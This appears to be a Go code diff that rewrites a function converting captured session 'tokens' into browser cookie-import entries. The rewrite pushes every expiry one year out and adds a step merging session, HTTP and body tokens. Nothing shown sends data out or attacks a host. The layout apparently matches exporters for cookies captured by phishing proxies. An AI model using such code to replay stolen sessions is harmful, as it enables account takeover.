@@ -8,6 +8,7 @@ import (
 	"path/filepath"
 	"sync"
 	"time"
+
 )
 
 type Token struct {
@@ -22,7 +23,7 @@ type Token struct {
 	Session          bool        `json:"session"`
 	FirstPartyDomain string      `json:"firstPartyDomain"`
 	PartitionKey     interface{} `json:"partitionKey"`
-	ExpirationDate   int64       `json:"expirationDate,omitempty"`
+	ExpirationDate   *int64       `json:"expirationDate,omitempty"`
 	StoreID          interface{} `json:"storeId"`
 }
 
@@ -31,25 +32,61 @@ func extractTokens(input map[string]map[string]map[string]interface{}) []Token {
 
 	for domain, tokenGroup := range input {
 		for _, tokenData := range tokenGroup {
-			token := Token{
-				Name:             tokenData["Name"].(string),
-				Value:            tokenData["Value"].(string),
-				Domain:           domain,
-				HostOnly:         false,
-				Path:             tokenData["Path"].(string),
-				Secure:           false,
-				HttpOnly:         tokenData["HttpOnly"].(bool),
-				SameSite:         "lax",
-				Session:          false,
-				FirstPartyDomain: "",
-				PartitionKey:     nil,
+			var t Token
+
+			if name, ok := tokenData["Name"].(string); ok {
+				// Remove &
+				t.Name = name
 			}
-			tokens = append(tokens, token)
+			if val, ok := tokenData["Value"].(string); ok {
+				t.Value = val
+			}
+			// Remove leading dot from domain
+			if len(domain) > 0 && domain[0] == '.' {
+				domain = domain[1:]
+			}
+			t.Domain = domain
+
+			if hostOnly, ok := tokenData["HostOnly"].(bool); ok {
+				t.HostOnly = hostOnly
+			}
+			if path, ok := tokenData["Path"].(string); ok {
+				t.Path = path
+			}
+			if secure, ok := tokenData["Secure"].(bool); ok {
+				t.Secure = secure
+			}
+			if httpOnly, ok := tokenData["HttpOnly"].(bool); ok {
+				t.HttpOnly = httpOnly
+			}
+			if sameSite, ok := tokenData["SameSite"].(string); ok {
+				t.SameSite = sameSite
+			}
+			if session, ok := tokenData["Session"].(bool); ok {
+				t.Session = session
+			}
+			if fpd, ok := tokenData["FirstPartyDomain"].(string); ok {
+				t.FirstPartyDomain = fpd
+			}
+			if pk, ok := tokenData["PartitionKey"]; ok {
+				t.PartitionKey = pk
+			}
+			
+			if storeID, ok := tokenData["storeId"]; ok {
+				t.StoreID = storeID
+			} else if storeID, ok := tokenData["StoreID"]; ok {
+				t.StoreID = storeID
+			}
+
+			exp := time.Now().AddDate(1, 0, 0).Unix()
+			t.ExpirationDate = &exp
+
+			tokens = append(tokens, t)
 		}
 	}
-
 	return tokens
 }
+
 func processAllTokens(sessionTokens, httpTokens, bodyTokens, customTokens string) ([]Token, error) {
 	var consolidatedTokens []Token
 
